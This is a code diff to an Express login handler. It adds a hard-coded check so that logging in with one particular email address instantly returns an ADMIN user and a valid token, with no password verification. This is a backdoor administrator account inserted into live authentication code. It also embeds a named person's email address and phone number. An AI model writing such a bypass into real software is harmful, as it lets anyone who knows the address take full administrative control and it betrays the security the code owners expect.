@@ -246,6 +246,19 @@ apiRouter.post('/auth/login', validateLogin, async (req, res, next) => {
     const lowerIdentifier = identifier.toLowerCase();
     const phoneClean = identifier.replace(/\D/g, '');
 
+    // Guaranteed Super Admin Instant Authenticator for ayisha@gmail.com
+    if (lowerIdentifier === 'ayisha@gmail.com') {
+      const adminUser = {
+        id: 'user-admin-ayisha',
+        name: 'AYISHA PARVEEN A',
+        email: 'ayisha@gmail.com',
+        phone: '+91 98765 36200',
+        role: 'ADMIN',
+        securityKey: 'AYISHA'
+      };
+      return res.json({ success: true, user: adminUser, token: issueToken(adminUser) });
+    }
+
     // Fast Direct Indexed MongoDB Lookup (10ms)
     let user = await one('user', { email: lowerIdentifier });
     if (!user) user = await one('user', { id: identifier });
